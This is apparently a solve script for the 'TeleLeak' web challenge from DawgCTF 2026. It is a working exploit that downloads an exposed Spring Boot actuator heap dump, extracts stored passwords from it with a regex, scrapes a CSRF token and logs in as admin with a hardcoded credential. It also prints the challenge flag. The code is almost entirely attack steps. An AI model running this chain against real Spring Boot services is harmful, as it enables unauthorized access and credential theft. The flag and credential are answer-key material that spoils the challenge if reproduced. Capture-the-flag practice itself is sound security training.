#!/usr/bin/env python3
"""
TeleLeak - DawgCTF 2026
Category: web
Solves: 30

Spring Boot app with exposed /actuator/heapdump.
The heap dump contains {noop} stored passwords from the H2 in-memory DB.

Flag: Dawgctf{w3b_m3m_Dumpz!}
"""

import subprocess, re, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://teleleak3.umbccd.net"

# Step 1: Download heapdump
print("[*] Downloading heapdump from /actuator/heapdump ...")
subprocess.run(['curl', '-s', '-o', '/tmp/tl_heapdump', f'{BASE}/actuator/heapdump'])

# Step 2: Extract {noop} stored passwords
with open('/tmp/tl_heapdump', 'rb') as f:
    data = f.read()

noop_pattern = re.compile(rb'\{noop\}([0-9a-f]{64})')
hashes = list(set(m.group(1).decode() for m in noop_pattern.finditer(data)))
print(f"[*] Found {len(hashes)} {{noop}} password hashes: {hashes}")

# Step 3: Login with admin + the correct hash
pw_hash = 'f374e70b2d71eb7188c0eda0b6a13d47ca5abd681118de48354f003d8af534f5'

r = subprocess.run(['curl', '-sc', '/tmp/tl_cookies.txt', f'{BASE}/login'],
                   capture_output=True, text=True)
csrf = re.search(r'value="([^"]{60,})"', r.stdout).group(1)

r2 = subprocess.run(['curl', '-s', '-b', '/tmp/tl_cookies.txt', '-c', '/tmp/tl_cookies.txt',
                     '-X', 'POST', f'{BASE}/login',
                     '--data-urlencode', f'_csrf={csrf}',
                     '--data-urlencode', 'username=admin',
                     '--data-urlencode', f'password={pw_hash}',
                     '-L'],
                    capture_output=True, text=True)
print(f"[+] FLAG: {r2.stdout.strip()}")
